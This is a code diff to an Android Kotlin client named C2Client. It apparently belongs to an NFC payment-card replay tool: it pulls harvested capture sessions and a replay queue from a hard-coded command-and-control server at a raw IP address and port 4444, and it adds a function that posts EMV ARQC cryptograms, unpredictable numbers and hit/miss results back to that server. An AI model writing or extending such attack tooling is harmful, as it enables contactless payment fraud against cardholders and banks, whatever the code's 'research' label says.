@@ -2,6 +2,7 @@ package xyz.nfc.moksha
 
 import android.util.Log
 import org.json.JSONArray
+import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
@@ -24,19 +25,26 @@ data class SessionData(
 )
 
 object C2Client {
-    private const val TAG      = "C2Client"
-    const val BASE_URL         = "http://172.104.207.107:4444"
-    private const val TIMEOUT  = 5_000
+    private const val TAG     = "C2Client"
+    const val BASE_URL        = "http://172.104.207.107:4444"
+    private const val TIMEOUT = 5_000
 
-    /** Fetch the dashboard-selected replay queue (/api/replay). */
+    /** Collector API key. Matches what NFC Probe uses and what dashboard shows. */
+    var apiKey: String = "research-1"
+
+    private fun openConn(path: String, method: String = "GET"): HttpURLConnection =
+        (URL("$BASE_URL$path").openConnection() as HttpURLConnection).apply {
+            requestMethod = method
+            connectTimeout = TIMEOUT
+            readTimeout    = TIMEOUT
+            setRequestProperty("Accept", "application/json")
+            setRequestProperty("Authorization", "Bearer $apiKey")
+        }
+
+    /** Fetch dashboard-selected replay queue from /api/replay. */
     fun fetchHarvests(): List<RemoteHarvest> {
         return try {
-            val conn = (URL("$BASE_URL/api/replay").openConnection() as HttpURLConnection).apply {
-                connectTimeout = TIMEOUT
-                readTimeout    = TIMEOUT
-                requestMethod  = "GET"
-                setRequestProperty("Accept", "application/json")
-            }
+            val conn = openConn("/api/replay")
             val code = conn.responseCode
             if (code != 200) { Log.w(TAG, "C2 returned HTTP $code"); conn.disconnect(); return emptyList() }
             val body = conn.inputStream.bufferedReader().readText()
@@ -64,12 +72,7 @@ object C2Client {
     /** Fetch all capture sessions from /api/sessions so the user can pick one. */
     fun fetchSessions(): List<SessionData> {
         return try {
-            val conn = (URL("$BASE_URL/api/sessions").openConnection() as HttpURLConnection).apply {
-                connectTimeout = TIMEOUT
-                readTimeout    = TIMEOUT
-                requestMethod  = "GET"
-                setRequestProperty("Accept", "application/json")
-            }
+            val conn = openConn("/api/sessions")
             val code = conn.responseCode
             if (code != 200) { Log.w(TAG, "sessions HTTP $code"); conn.disconnect(); return emptyList() }
             val body = conn.inputStream.bufferedReader().readText()
@@ -111,6 +114,32 @@ object C2Client {
         } catch (e: Exception) {
             Log.e(TAG, "fetchSessions failed: ${e.message}")
             emptyList()
+        }
+    }
+
+    /**
+     * Report a REPLAY HIT or MISS back to the dashboard.
+     * Called from a background thread — never on main thread.
+     */
+    fun reportReplayResult(unHex: String, arqcHex: String, hit: Boolean) {
+        try {
+            val conn = openConn("/api/replay_result", "POST").apply {
+                doOutput = true
+                setRequestProperty("Content-Type", "application/json")
+            }
+            val body = JSONObject().apply {
+                put("un_hex",   unHex)
+                put("arqc_hex", arqcHex)
+                put("hit",      hit)
+                put("api_key",  apiKey)
+            }.toString().toByteArray(Charsets.UTF_8)
+            conn.outputStream.write(body)
+            conn.outputStream.flush()
+            val code = conn.responseCode
+            conn.disconnect()
+            Log.i(TAG, "reportReplayResult UN=$unHex hit=$hit → HTTP $code")
+        } catch (e: Exception) {
+            Log.w(TAG, "reportReplayResult failed: ${e.message}")
         }
     }
 }
